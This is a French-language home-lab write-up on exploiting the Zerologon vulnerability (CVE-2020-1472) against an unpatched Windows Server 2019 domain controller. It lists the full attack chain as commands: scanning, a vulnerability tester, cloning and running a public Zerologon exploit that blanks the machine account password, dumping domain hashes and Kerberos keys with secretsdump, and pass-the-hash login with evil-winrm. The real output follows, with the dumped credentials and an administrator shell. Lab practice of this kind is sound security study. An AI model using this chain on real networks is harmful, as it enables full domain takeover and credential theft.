 # LAB 1 - Exploit DC Vulnerability

Prérequis:
- 1x VM Clone avec un clone lié Windows Server 2019 d'avant 18/06/2019 (2x CPU 2x Go RAM - 40Go RAM - 1x NIC sur VMBR1)
- 1x CT LXC - Debian

## Explication de la CVE
https://cyberwatch.fr/cve/vulnerabilite-cve-2020-1472/

### Chercher le serveur Windows
`nmap -Pn 192.168.X.X/24`

### Enumérer le nom de domaine NetBIOS
https://null-byte.wonderhowto.com/how-to/enumerate-netbios-shares-with-nbtscan-nmap-scripting-engine-0193957/

`nbtscan 192.168.20.188`

### Testeur d'hote exploitable
`pip install impacket`

`git clone https://github.com/SecuraBV/CVE-2020-1472.git`

`cd CVE-2020-1472`

Cibler le serveur Windows pour voir si exploitable ou non:
`python3 zerologon_tester.py <Nom de la machine cible> <ip de la machien cible>`

`python3 zerologon_tester.py DC01 192.168.20.188`

Si fail, votre Windows est patché contre cet exploit, réinstaller un autre Windows Server non patché et recréer un domaine.

**ZeroDay Exploit installation**
```
git clone https://github.com/Sq00ky/Zero-Logon-Exploit.git
cd Zero-Logon-Exploit
apt install python3-venv
python3 -m venv impacketEnv
source impacketEnv/bin/activate
```
```
git clone https://github.com/SecureAuthCorp/impacket /opt/impacket
cd /opt/impacket
pip3 install .
python3 setup.py install
```

**Run ZeroDay Exploit**
```
cd /root/Zero-Logon-Exploit

python3 zeroLogon-NullPass.py dc01 192.168.20.188
```

**Run Secretsdump**
`python3 /opt/impacket/examples/secretsdump.py -just-dc -no-pass DC01\$@192.168.20.188`

```
mpacket v0.10.1.dev1+20230718.100545.fdbd2568 - Copyright 2022 Fortra

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrateur:500:aad3b435b51404eeaad3b435b51404ee:d274dd827e15788ae75b282c20a668d8:::
```

**Run WinRM with the HASH**
`evil-winrm -u Administrateur -H d274dd827e15788ae75b282c20a668d8 -i 192.168.20.188`

`*Evil-WinRM* PS C:\`


### Sources

Check les scripts GIT

https://github.com/fortra/impacket

https://github.com/SecuraBV/CVE-2020-1472

https://github.com/Sq00ky/Zero-Logon-Exploit

https://0xss0rz.github.io/2021-05-31-ZeroLogon/






# Mise en Pratique

## **Résultat Scan avec Nmap** 

``` 
nmap -Pn 192.168.1.96/24 

```

Starting Nmap 7.93 ( https://nmap.org ) at 2026-02-12 14:54 UTC


Nmap scan report for 192.168.1.96

Host is up (0.00031s latency)

Not shown: 988 filtered tcp ports (no-response)

PORT     STATE SERVICE

53/tcp   open  domain

88/tcp   open  kerberos-sec

135/tcp  open  msrpc

139/tcp  open  netbios-ssn

389/tcp  open  ldap

445/tcp  open  microsoft-ds

464/tcp  open  kpasswd5

593/tcp  open  http-rpc-epmap

636/tcp  open  ldapssl

3268/tcp open  globalcatLDAP

3269/tcp open  globalcatLDAPssl

3389/tcp open  ms-wbt-server

MAC Address: BC:24:11:78:CD:A1 (Unknown)

## **Résultat de nbtscan**

``` 
nbtscan 192.168.1.96 

```     
Doing NBT name scan for addresses from 192.168.1.96

|IP address | NetBIOS Name | Server | User |MAC address|      
|-----------|--------------|--------|------|-----------|
|192.168.1.96|CVEANTHO     |<server>|<unknown>|bc:24:11:78:cd:a1|


``` 
python3 zerologon_tester.py cveantho 192.168.1.96 

```

Performing authentication attempts...

Success! DC can be fully compromised by a Zerologon attack.

 ## **Test du run Zeroday**

``` 
python3 zeroLogon-NullPass.py cveantho 192.168.1.96

 ```

  
Performing authentication attempts...

Failure to Autheticate at attempt number: 208

Zero Logon successfully exploited, changing password.

## **Run Secretdump**

``` 
python3 /opt/impacket/examples/secretsdump.py -just-dc -no-pass cveantho\$@192.168.1.96 

```
Impacket v0.14.0.dev0+20260209.180151.8cb82c0f - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)

[*] Using the DRSUAPI method to get NTDS.DIT secrets

Administrateur:500:aad3b435b51404eeaad3b435b51404ee:`4dfa8c1f65780cc2622eeeea89ad7e1e`:::

Invité:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

krbtgt:502:aad3b435b51404eeaad3b435b51404ee:b33098e00a04a68267164e785570c0fd:::

CVEANTHO$:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

[*] Kerberos keys grabbed

Administrateur:aes256-cts-hmac-sha1-96:94fe3608e47e6cf6aed653b9aabdf027a03b3111e5edc7d4d16bcbd26a7f8ef1

Administrateur:aes128-cts-hmac-sha1-96:34983ae974e5e840437436b6092522b3

Administrateur:des-cbc-md5:9240611a0bdc4a3b

krbtgt:aes256-cts-hmac-sha1-96:5eedaa23a59f40e627b7cdb5c70cbb6b12e03c9eeebf8f9d652561ff46ec19f6

krbtgt:aes128-cts-hmac-sha1-96:505303b63223eedbed81e0f47e1967ff

krbtgt:des-cbc-md5:f792d9fe31ad85b9

CVEANTHO$:aes256-cts-hmac-sha1-96:12c36bdb5327aaebf11c4ff9cf5a9656dfdaf8ea2943d6e7f2457ae19aa45092

CVEANTHO$:aes128-cts-hmac-sha1-96:49704c899b4520a24448248e4dcf0ca0

CVEANTHO$:des-cbc-md5:ef0107516e61d5d9

[*] Cleaning up... 

 ## **Run WinRM with the HASH**

 il faut installer le paquet

 ``` 
 apt install ruby ruby-dev build-essential 
 ```

 Puis 

 ``` 
 gem install evil-winrm 
 
 ```

Puis 

``` 
evil-winrm -u Administrateur -H 4dfa8c1f65780cc2622eeeea89ad7e1e -i 192.168.1.96 

```
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrateur\Documents> 

*Evil-WinRM* PS C:\Users\Administrateur\Documents> whoami

cve\administrateur

*Evil-WinRM* PS C:\Users\Administrateur\Documents> hostname

cveantho

*Evil-WinRM* PS C:\Users\Administrateur\Documents> 

